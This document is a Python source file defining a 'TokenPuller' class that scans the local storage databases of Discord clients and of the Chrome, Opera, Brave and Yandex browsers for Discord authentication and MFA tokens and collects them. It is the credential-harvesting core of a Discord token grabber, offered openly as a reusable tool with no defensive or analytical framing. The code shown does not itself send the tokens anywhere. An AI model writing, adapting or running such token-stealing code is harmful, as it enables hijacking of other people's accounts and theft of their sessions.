"""
MIT License

Copyright (c) 2021-present adam7100

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import re
from typing import List

__all__ = ("TokenPuller",)


class TokenPuller:
    """
    Represents a token puller that pulls tokens.
    """

    __slots__ = ()

    TOKEN_REGEX = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    MFA_TOKEN_REGEX = re.compile(r"mfa\.[\w-]{84}")

    def get_tokens_from_path(self, path: str) -> List[str]:
        """
        Returns the tokens from the path.

        :param str path: The path.
        :return: The list of tokens
        :rtype: List[str]
        """

        path += "/Local Storage/leveldb"

        if not os.path.exists(path):
            return []

        tokens = []
        file_names = [
            filename
            for filename in os.listdir(path)
            if filename.endswith(".log") or filename.endswith(".ldb")
        ]

        for file_name in file_names:
            with open(f"{path}/{file_name}", errors="ignore") as f:
                content = f.readlines()

                for line in [x.strip() for x in content if x.strip()]:
                    for regex in (self.TOKEN_REGEX, self.MFA_TOKEN_REGEX):
                        for token in regex.findall(line):
                            tokens.append(token)

        return tokens

    @staticmethod
    def get_paths() -> List[str]:
        """
        Returns the paths.

        :return: The paths.
        :rtype: List[str]
        """

        local = os.getenv("LOCALAPPDATA")
        roaming = os.getenv("APPDATA")

        if not local or not roaming:
            return [f"{os.getenv('HOME')}/Library/Application Support/discord"]

        return [
            roaming + r"\Discord",
            roaming + r"\discordcanary",
            roaming + r"\discordptb",
            local + r"\Google\Chrome\User Data\Default",
            roaming + r"\Opera Software\Opera Stable",
            local + r"\BraveSoftware\Brave-Browser\User Data\Default",
            roaming + r"\Yandex\YandexBrowser\User Data\Default",
        ]

    def get_tokens(self) -> List[str]:
        """
        Returns the tokens.
        Most wont be valid.

        :return: The tokens.
        :rtype: List[str]
        """

        tokens = []

        for path in self.get_paths():
            tokens += self.get_tokens_from_path(path)

        return tokens
